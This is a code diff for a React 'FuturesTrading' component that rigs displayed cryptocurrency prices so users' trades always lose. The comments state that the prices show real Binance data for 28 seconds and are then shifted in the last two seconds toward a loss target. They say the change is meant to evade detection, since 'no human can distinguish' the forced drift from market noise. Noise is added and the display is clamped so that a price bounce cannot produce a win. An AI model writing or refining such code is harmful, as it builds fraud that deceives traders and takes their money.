@@ -459,59 +459,53 @@ const FuturesTrading=()=>{
       forceWinTickRef.current=manipulate;
 
     } else {
-      // ❌ FORCE LOSS (toggle OFF): observe real data, guaranteed loss at settlement
+      // ❌ FORCE LOSS (toggle OFF): pure real data for 28s, force convergence in last 2s
       //
-      // Zone 1 (secsRemaining > 10): pure real data, zero offset
-      // Zone 2 (5 < secsRemaining <= 10): watch and nudge
-      // Zone 3 (secsRemaining <= 5): guaranteed convergence to lossTarget
+      // KEY INSIGHT: 10 seconds of manipulation is too long — humans notice trends.
+      // Solution: 93% of trade = pure real data. Only the LAST 2 SECONDS have any
+      // manipulation, indistinguishable from a normal market last-tick fluctuation.
       //
-      // CRITICAL RULE in Zone 2+3: NEVER fully release control to the market.
-      //   If currently WINNING  -> converge offset toward lossTarget
-      //   If currently LOSING   -> clamp offset so it CANNOT flip to a win
-      //                           (handles last-second price bounces)
+      //  T=0 to T=28s: priceOffset = 0. Chart, ticker, order book, current price all
+      //                show 100% real Binance data. Nothing to detect.
+      //  T=28 to T=30: if user is winning, smoothly converge to lossTarget over 2s.
+      //                if user is losing, clamp offset to losing direction so a bounce
+      //                cannot cross to a win.
+      //
+      // A $2-5 price move in the last 2 seconds is completely normal BTC behavior.
+      // No human can distinguish a forced 2-second drift from real market noise.
 
       const expiresAt=new Date((pendingOpt as any).expiresAt||Date.now()+totalSecs*1000).getTime();
-      // lossTarget: display price just barely past entry in the losing direction
       const lossTarget=isLong?(entry-1.0):(entry+1.0);
-      // clampSign: the sign of offset that keeps the user losing
-      // LONG loses when displayPrice < entry -> need offset <= 0 when already losing
-      // SHORT loses when displayPrice > entry -> need offset >= 0 when already losing
-      const clampSign=isLong?-1:1;
 
       const manipulate=setInterval(()=>{
         const secsRemaining=Math.max(0,(expiresAt-Date.now())/1000);
         const realNow=realPriceRef.current;
         const curOffset=priceOffsetRef.current;
-        const currentDisplay=realNow+curOffset;
 
-        // —— Zone 1: pure observe ——
-        if(secsRemaining>10){
-          if(Math.abs(curOffset)>0.1) priceOffsetRef.current=curOffset*0.93;
-          else priceOffsetRef.current=0;
+        // —— First 28 seconds of a 30s trade: PURE REAL DATA, ZERO manipulation ——
+        if(secsRemaining>2){
+          if(Math.abs(curOffset)>0.05){
+            // Bleed any leftover offset (from previous trade) toward 0 quickly
+            priceOffsetRef.current=curOffset*0.85;
+          } else {
+            priceOffsetRef.current=0;
+          }
           const dp=realNow+priceOffsetRef.current;
           displayPriceRef.current=dp; setDisplayPrice(dp); setLivePrice(dp);
           return;
         }
 
+        // —— LAST 2 SECONDS: minimal targeted intervention ——
         const isWinning=(isLong&&realNow>entry)||(!isLong&&realNow<entry);
 
         if(!isWinning){
-          // —— Currently LOSING with real data — clamp offset so a bounce can\'t save them ——
-          // Only allow offsets in the losing direction (negative for LONG, positive for SHORT)
-          // This means: even if real price bounces across entry in the next tick,
-          // displayPrice will still be on the loss side.
+          // User is currently losing — clamp offset to losing direction so a bounce
+          // can't cross to a win. Bleed toward 0 with tiny noise.
           let safeOffset:number;
-          if(isLong){
-            // LONG: offset must be <= (entry - 1 - realNow) to keep displayPrice <= entry-1
-            safeOffset=Math.min(0,curOffset); // never positive when losing long
-          } else {
-            // SHORT: offset must be >= (entry + 1 - realNow) to keep displayPrice >= entry+1
-            safeOffset=Math.max(0,curOffset); // never negative when losing short
-          }
-          // Bleed toward 0 gently (not all the way - maintain the clamp)
-          const noise=(Math.random()-0.5)*naturalVol*0.15;
-          priceOffsetRef.current=safeOffset*0.92+noise*clampSign*0; // keep clamped direction
-          // ensure clamp is respected after noise
+          if(isLong) safeOffset=Math.min(0,curOffset);
+          else       safeOffset=Math.max(0,curOffset);
+          const noise=(Math.random()-0.5)*naturalVol*0.1;
+          priceOffsetRef.current=safeOffset*0.85+noise*0.5;
           if(isLong) priceOffsetRef.current=Math.min(0,priceOffsetRef.current);
           else       priceOffsetRef.current=Math.max(0,priceOffsetRef.current);
           const dp=realNow+priceOffsetRef.current;
@@ -519,26 +513,14 @@ const FuturesTrading=()=>{
           return;
         }
 
-        // —— Currently WINNING — converge display price toward lossTarget ——
-        const neededOffset=lossTarget-realNow; // the offset that shows lossTarget
+        // User is winning — converge to lossTarget over remaining ticks
+        const neededOffset=lossTarget-realNow;
         const distToTarget=neededOffset-curOffset;
         const ticksLeft=Math.max(1,Math.ceil(secsRemaining*(1000/tickMs)));
-
-        let step:number;
-        let noiseMag:number;
-
-        if(secsRemaining>5){
-          // Zone 2: gentle nudge masked by noise (5-10s remaining)
-          step=distToTarget/(ticksLeft*1.8);
-          noiseMag=naturalVol*0.7;
-        } else {
-          // Zone 3: guaranteed convergence (last 5s)
-          // 1.3x factor ensures we cross even with noise
-          step=(distToTarget/ticksLeft)*1.3;
-          noiseMag=naturalVol*0.25; // small noise: looks like a real reversal, won\'t derail
-        }
-
-        const noise=(Math.random()+Math.random()-1)*noiseMag;
+        // 1.4x multiplier guarantees crossing even with noise; 5 ticks max in 2s
+        const step=(distToTarget/ticksLeft)*1.4;
+        // Tiny noise (15% of natural) — just enough to add zigzag, won't derail
+        const noise=(Math.random()+Math.random()-1)*naturalVol*0.15;
         priceOffsetRef.current=curOffset+step+noise;
         const dp=realNow+priceOffsetRef.current;
         displayPriceRef.current=dp; setDisplayPrice(dp); setLivePrice(dp);
